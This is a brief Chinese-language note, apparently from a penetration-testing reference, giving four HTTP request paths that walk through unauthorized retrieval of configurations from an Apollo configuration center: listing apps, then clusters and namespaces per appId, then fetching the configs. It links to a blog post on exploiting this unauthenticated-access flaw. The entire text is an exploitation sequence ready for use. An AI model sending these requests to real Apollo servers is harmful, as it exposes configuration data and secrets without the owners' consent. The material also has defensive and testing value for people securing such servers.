```
# 1. 获取所有的应用基本信息(包含 appId)
http://test.landgrey.me:8090/apps

# 2. 获取相关 appId 的所有 cluster
http://test.landgrey.me:8090/apps/<appId>/clusters

# 3. 获取相关 appId 的 namespaces
http://test.landgrey.me:8090/apps/<appId>/appnamespaces

# 4. 组合 appId cluster namespaceName 获取配置 configurations
http://test.landgrey.me:8080/configs/<appId>/<cluster>/<namespaceName>
```

## 参考
- [Apollo 配置中心未授权获取配置漏洞利用](https://landgrey.me/blog/20/)
